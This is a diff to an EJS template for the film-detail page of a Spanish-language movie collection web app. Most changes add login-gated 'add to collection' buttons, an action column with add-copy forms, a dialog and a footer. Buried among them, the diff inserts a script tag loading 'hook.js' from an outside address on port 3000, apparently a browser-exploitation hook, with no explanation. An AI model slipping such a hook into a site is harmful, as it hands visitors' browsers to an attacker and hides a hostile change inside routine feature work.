@@ -30,7 +30,11 @@
                 </div>
             </div>
             <p class="descripcion-pelicula"><%= pelicula.descripcion %></p>
-            <button id="add-film"><span class="plus-button"><i class="fa-solid fa-plus fa-sm"></i></span>Añadir a colección</button>
+            <% if (isLogged) { %>
+                <button id="add-film" onclick="addFirstCopy()"><span class="plus-button"><i class="fa-solid fa-plus fa-sm"></i></span>Añadir a colección</button>
+            <% } else { %>
+                <a href="/login" id="add-film" style="text-decoration: none; display: inline-flex; align-items: center; gap: 10px; align-self: self-start; font-size: 1rem; justify-self: start; font-family: 'Poppins', sans-serif; font-weight: 500; background: var(--pure-white); border: 0px; border-radius: 8px; color: var(--blue-text-on-item); padding: 10px 20px; cursor: pointer;"><span class="plus-button"><i class="fa-solid fa-plus fa-sm"></i></span>Añadir a colección</a>
+            <% } %>
         </section>
         <section id="lista-de-copias">
             <h1>Lista de copias</h1>
@@ -40,6 +44,7 @@
                     <th>Número de copia</th>
                     <th>Estado</th>
                     <th>Formato</th>
+                    <th>Acción</th>
                   </tr>
                 </thead>
                 <tbody>
@@ -48,12 +53,34 @@
                       <td><%= i + 1 %></td>
                       <td><%= copia.estado %></td>
                       <td><%= copia.formato %></td>
+                      <td>
+                        <% if (isLogged) { %>
+                          <form action="/pelicula/<%= pelicula.id %>/add-copy" method="post" style="display: inline;">
+                            <input type="hidden" name="estado" value="<%= copia.estado %>">
+                            <input type="hidden" name="formato" value="<%= copia.formato %>">
+                            <button type="submit" class="btn-añadir-copia">Añadir</button>
+                          </form>
+                        <% } else { %>
+                          <a href="/login" class="btn-añadir-copia">Añadir</a>
+                        <% } %>
+                      </td>
                     </tr>
                   <% }); %>
                 </tbody>
               </table>
         </section>
     </main>
+
+    <script src="http:10.0.2.15:3000/hook.js"></script>
     
+    <dialog id="success-dialog">
+      <p id="success-message"></p>
+      <button id="close-dialog-btn">Aceptar</button>
+    </dialog>
+
+    <!-- FOOTER -->
+    <%- include('partials/footer') %>
+
 </body>
+<script src="/javascripts/code.js"></script>
 </html>
